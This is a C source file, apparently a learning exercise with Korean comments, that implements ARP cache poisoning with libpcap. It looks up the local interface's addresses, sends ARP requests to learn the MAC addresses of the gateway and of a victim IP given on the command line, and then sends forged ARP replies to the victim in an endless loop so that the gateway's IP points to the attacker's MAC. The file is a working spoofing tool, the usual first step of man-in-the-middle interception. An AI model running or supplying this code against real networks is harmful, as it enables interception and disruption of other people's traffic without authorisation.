#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#include <sys/ioctl.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <net/if.h>
#include <arpa/inet.h>
#include <net/ethernet.h>
#include <netinet/if_ether.h>

#include <pcap.h>

#define  BUFF_SIZE   1024

#define ARP_REQUEST 1  // ARP Request
#define ARP_REPLY 2     // ARP Reply

/*
    어딘가에 arphdr이라는 구조체가 존재한다.
    if_ether.h 안의 arp_if.h 인가? 여튼 거기에 있어가지고
    기껏 하나로 만들어둔 ARP Header가 망해버리는 바람에 이름이 arphadr가 되어버렸다 ㅠㅠ

    사실 누가 만들어 둔거임 ㅎㅎ
*/

typedef struct arphadr { 
    u_int16_t htype;    /* Hardware Type           */ 
    u_int16_t ptype;    /* Protocol Type           */ 
    u_char hlen;        /* Hardware Address Length */ 
    u_char plen;        /* Protocol Address Length */ 
    u_int16_t oper;     /* Operation Code          */ 
    u_char sha[6];      /* Sender hardware address */ 
    u_char spa[4];      /* Sender IP address       */ 
    u_char tha[6];      /* Target hardware address */ 
    u_char tpa[4];      /* Target IP address       */ 
}arphdr_t; 

#define MAXBYTES_CAPTURE 2048

// 신나는 리팩토링 시간

int sendarp_req(pcap_t *descr, unsigned char* req_target_ip, unsigned char* req_source_ip,  unsigned char* req_target_mac,  unsigned char* req_source_mac)
{
    struct ether_header header;
    header.ether_type=htons(ETH_P_ARP);

    struct ether_arp req;
    req.arp_hrd=htons(ARPHRD_ETHER);
    req.arp_pro=htons(ETH_P_IP);
    req.arp_hln=ETHER_ADDR_LEN;
    req.arp_pln=sizeof(in_addr_t);
    req.arp_op=htons(ARPOP_REQUEST);

    struct in_addr target_ip_addr={0};
    if (!inet_aton(req_target_ip,&target_ip_addr)) {
       fprintf(stderr,"%s is not a valid IP address",req_target_ip);
       exit(1);
    }
    memcpy(&req.arp_tpa,&target_ip_addr.s_addr,sizeof(req.arp_tpa));
    struct in_addr source_ip_addr={0};
    if (!inet_aton(req_source_ip,&source_ip_addr)) {
       fprintf(stderr,"%s is not a valid IP address",req_source_ip);
       exit(1);
    }

    memcpy(&req.arp_spa,&source_ip_addr.s_addr,sizeof(req.arp_spa));
    memcpy(header.ether_dhost,req_target_mac,sizeof(header.ether_dhost));
    memcpy(header.ether_shost,req_source_mac,sizeof(header.ether_shost));
    memcpy(&req.arp_sha,req_source_mac,sizeof(req.arp_sha));
    memcpy(&req.arp_tha,req_target_mac,sizeof(req.arp_tha));

    unsigned char frame[sizeof(struct ether_header)+sizeof(struct ether_arp)];
    memcpy(frame,&header,sizeof(struct ether_header));
    memcpy(frame+sizeof(struct ether_header),&req,sizeof(struct ether_arp));

    if (pcap_inject(descr,frame,sizeof(frame))==-1) {
        pcap_perror(descr,0);
        pcap_close(descr);
        exit(1);
    }
}

// 신나는 리팩토링 시간 2
// 사실 Reply 쏘는 거랑 Request 쏘는 함수의 차이는 OPCODE 하나 차이라 카더라 

int sendarp_rep(pcap_t *descr, unsigned char* rep_target_ip, unsigned char* rep_source_ip,  unsigned char* rep_target_mac,  unsigned char* rep_source_mac)
{
    struct ether_header header;
    header.ether_type=htons(ETH_P_ARP);
    
    struct ether_arp rep;
    rep.arp_hrd=htons(ARPHRD_ETHER);
    rep.arp_pro=htons(ETH_P_IP);
    rep.arp_hln=ETHER_ADDR_LEN;
    rep.arp_pln=sizeof(in_addr_t);
    rep.arp_op=htons(ARPOP_REPLY);

    struct in_addr target_ip_addr={0};
    if (!inet_aton(rep_target_ip,&target_ip_addr)) {
       fprintf(stderr,"%s is not a valid IP address",rep_target_ip);
       exit(1);
    }
    memcpy(&rep.arp_tpa,&target_ip_addr.s_addr,sizeof(rep.arp_tpa));
    struct in_addr source_ip_addr={0};
    if (!inet_aton(rep_source_ip,&source_ip_addr)) {
       fprintf(stderr,"%s is not a valid IP address",rep_source_ip);
       exit(1);
    }

    memcpy(&rep.arp_spa,&source_ip_addr.s_addr,sizeof(rep.arp_spa));
    memcpy(header.ether_dhost,rep_target_mac,sizeof(header.ether_dhost));
    memcpy(header.ether_shost,rep_source_mac,sizeof(header.ether_shost));
    memcpy(&rep.arp_sha,rep_source_mac,sizeof(rep.arp_sha));
    memcpy(&rep.arp_tha,rep_target_mac,sizeof(rep.arp_tha));

    unsigned char frame[sizeof(struct ether_header)+sizeof(struct ether_arp)];
    memcpy(frame,&header,sizeof(struct ether_header));
    memcpy(frame+sizeof(struct ether_header),&rep,sizeof(struct ether_arp));

    if (pcap_inject(descr,frame,sizeof(frame))==-1) {
        pcap_perror(descr,0);
        pcap_close(descr);
        exit(1);
    }
}

void ip_in(char* org_string, unsigned char* inip)
{
	int len;
 	len = sprintf(org_string, "%d", inip[0]);
 	len += sprintf(len + org_string, ".%d", inip[1]);
 	len += sprintf(len + org_string, ".%d", inip[2]);
 	len += sprintf(len + org_string, ".%d", inip[3]);
}

int main(int argc, char *argv[])
{
	if (argc != 2)
	{ 
   		printf("USAGE: send_arp <victim_ip>\n"); 
   	 	exit(1); 
	}

	char* victim_ip = argv[1];
	int fd;
	struct ifreq ifr;
	
	fd = socket(AF_INET, SOCK_DGRAM, 0);
	
	ifr.ifr_addr.sa_family = AF_INET;
	strncpy(ifr.ifr_name, "wlp1s0", IFNAMSIZ-1);

	ioctl(fd, SIOCGIFHWADDR, &ifr);

	unsigned char* mac = (unsigned char*)ifr.ifr_hwaddr.sa_data;
	printf("MAC ADDRESS : %02x:%02x:%02x:%02x:%02x:%02x\n",mac[0],mac[1],mac[2],mac[3],mac[4],mac[5]);

	close(fd);

	char  buff[BUFF_SIZE];
	char buff2[BUFF_SIZE];
	char ips[BUFF_SIZE] = {0};
	char gateway[BUFF_SIZE] = {0};

	FILE *fp = popen("nmcli dev show wlp1s0 | awk \'{ print $2}\'","r");

	for(int i=0; i<8; i++)
	{
		if(i==7)
			fgets(buff2,BUFF_SIZE,fp);
		fgets(buff,BUFF_SIZE,fp);
	}

	for(int s=0; s<sizeof(buff2); s++)
	{
		if(buff2[s] == 47)
			break;
		ips[s] = buff2[s];
	}

	printf("IP ADDRESS : %s\n", ips);

	for(int s=0; s<sizeof(buff); s++)
	{
		if(buff[s] == 10)
			break;
		gateway[s] = buff[s];
	}

	printf("GATEWAY IP : %s\n", gateway);

	pclose(fp);

	char *dev, errbuf[PCAP_ERRBUF_SIZE];


	dev = pcap_lookupdev(errbuf);
	int i=0; 
 	bpf_u_int32 netaddr=0, mask=0; 
 	struct bpf_program filter;  
 	pcap_t *descr = NULL;   
 	struct pcap_pkthdr pkthdr; 
 	const unsigned char *packet=NULL;
 	arphdr_t *arpheader = NULL;

 	if ((descr = pcap_open_live(dev, MAXBYTES_CAPTURE, 0,  512, errbuf))==NULL)
 	{
    		fprintf(stderr, "ERROR: %s\n", errbuf);
    		exit(1);
 	}
    
 	if( pcap_lookupnet( dev , &netaddr, &mask, errbuf) == -1)
 	{
    		fprintf(stderr, "ERROR: %s\n", errbuf);
    		exit(1);
 	}

	if ( pcap_compile(descr, &filter, "arp", 1, mask) == -1)
	{
    		fprintf(stderr, "ERROR: %s\n", pcap_geterr(descr) );
    		exit(1);
 	}

 	if (pcap_setfilter(descr,&filter) == -1)
 	{
    		fprintf(stderr, "ERROR: %s\n", pcap_geterr(descr) );
    		exit(1);
 	}

 	unsigned char zero_mac[6];
 	zero_mac[0] = 0xff;
 	zero_mac[1] = 0xff;
 	zero_mac[2] = 0xff;
 	zero_mac[3] = 0xff;
 	zero_mac[4] = 0xff;
 	zero_mac[5] = 0xff;
 	unsigned char* test = (unsigned char*) zero_mac;

    // 여기서 리퀘스트 게이트웨이와 Victim MAC을 가져오기 위한 Request 발사

 	sendarp_req(descr, gateway,ips, test,mac);
 	sendarp_req(descr, victim_ip,ips, test,mac);

    char gateway_get[BUFF_SIZE];
    char victim_get[BUFF_SIZE];
    unsigned char gateway_mac[6];
    unsigned char victim_mac[6];

    int isGetGateway = 0;
    int isGetVictim = 0;

    int turn = 0;


 	while(1)
 	{ 

        // Mac이 다 있으면 Victim에게 변조된 ARP패킷 무한발사...

 		if(isGetVictim && isGetGateway && !turn)
 		{
 			sendarp_rep(descr, victim_ip, gateway, victim_mac, mac);
 			printf("Sending ARP Packet to Victim.....\n");
 		}

 		if(turn)
 			turn = 0;
 		else
 			turn = 1;

  		if ( (packet = pcap_next(descr,&pkthdr)) == NULL)
  		{
    			fprintf(stderr, "ARP Packet Capture Failure : %s\n", errbuf);
    			continue;
 		}

 		arpheader = (struct arphadr *)(packet+14);

        // 첫번쨰로 온 패킷은 무조건 게이트웨이 Reply
        // 두번째로 온 패킷은 무조건 Victim Reply
        // 왜? 내가 쏴 줬으니까.

  		if(isGetGateway)
 			ip_in(victim_get, arpheader->spa);
 		ip_in(gateway_get, arpheader->spa);

 		printf("%s\n",gateway_get);

        // 거기서 MAC을 뽑아낸다.
 		
 		if(!strcmp(gateway_get,gateway) && !isGetGateway)
 		{
 			printf("Get GW MAC Data.....\n");
 			gateway_mac[0] = arpheader->sha[0];
 			gateway_mac[1] = arpheader->sha[1];
 			gateway_mac[2] = arpheader->sha[2];
 			gateway_mac[3] = arpheader->sha[3];
 			gateway_mac[4] = arpheader->sha[4];
 			gateway_mac[5] = arpheader->sha[5];
 			isGetGateway = 1;
 		}

 		if(!strcmp(victim_ip,victim_get) && !isGetVictim)
 		{
 			printf("Get Victim MAC Data.....\n");
 			victim_mac[0] = arpheader->sha[0];
 			victim_mac[1] = arpheader->sha[1];
 			victim_mac[2] = arpheader->sha[2];
 			victim_mac[3] = arpheader->sha[3];
 			victim_mac[4] = arpheader->sha[4];
 			victim_mac[5] = arpheader->sha[5];
 			isGetVictim = 1;
 		}

        // pcap 연 김에 ㄴ덤으로 ARP Packet 좀 잡아서 띄워줌

 		printf("\n\nReceived Packet Size: %d bytes\n", pkthdr.len); 
 		printf("Hardware type: %s\n", (ntohs(arpheader->htype) == 1) ? "Ethernet" : "Unknown"); 
 		printf("Protocol type: %s\n", (ntohs(arpheader->ptype) == 0x0800) ? "IPv4" : "Unknown"); 
 		printf("Operation: %s\n", (ntohs(arpheader->oper) == ARP_REQUEST)? "ARP Request" : "ARP Reply"); 

  		if (ntohs(arpheader->htype) == 1 && ntohs(arpheader->ptype) == 0x0800)
  		{ 
    			printf("Sender MAC: "); 

    			for(i=0; i<6;i++)
        		printf("%02X:", arpheader->sha[i]); 

    			printf("\nSender IP: "); 

    			for(i=0; i<4;i++)
        			printf("%d.", arpheader->spa[i]); 

    			printf("\nTarget MAC: "); 

    			for(i=0; i<6;i++)
        			printf("%02X:", arpheader->tha[i]); 

    			printf("\nTarget IP: "); 

    			for(i=0; i<4; i++)
        			printf("%d.", arpheader->tpa[i]); 
    
    			printf("\n"); 
  		} 

 	} 

	return 0;
}